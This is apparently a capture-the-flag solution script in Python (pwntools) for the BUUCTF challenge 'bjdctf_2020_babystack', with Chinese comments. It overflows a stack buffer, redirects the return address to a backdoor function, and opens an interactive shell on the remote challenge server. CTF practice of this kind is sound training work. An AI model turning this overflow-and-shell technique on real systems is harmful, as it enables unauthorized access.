'''
@Author       : 白银
@Date         : 2023-03-31 16:15:45
@LastEditors  : 白银
@LastEditTime : 2023-03-31 17:31:48
@FilePath     : /pwn/bjdctf_2020_babystack.py
@Description  : https://buuoj.cn/challenges#bjdctf_2020_babystack
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''


from pwn import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './bjdctf_2020_babystack'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改


# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)

if if_remote == 1:
    # io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    io = remote("node4.buuoj.cn", 27491)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x18  # ida看，buf和r差多少
return_addr = 0x4006e6  # 程序里面有backdoor的函数，直接找地址

payload = flat(['a' * padding, return_addr])
delimiter = '[+]Please input the length of your name:'
delimiter2 = '[+]What\'s u name?'

if if_remote == 1:
    io.sendlineafter(delimiter, str(len(payload)))  # 远程用
    io.sendlineafter(delimiter2, payload)  # 远程用

else:
    io.sendlineafter(delimiter, str(len(payload)))  # 本地用
    io.sendlineafter(delimiter2, payload)

io.interactive()
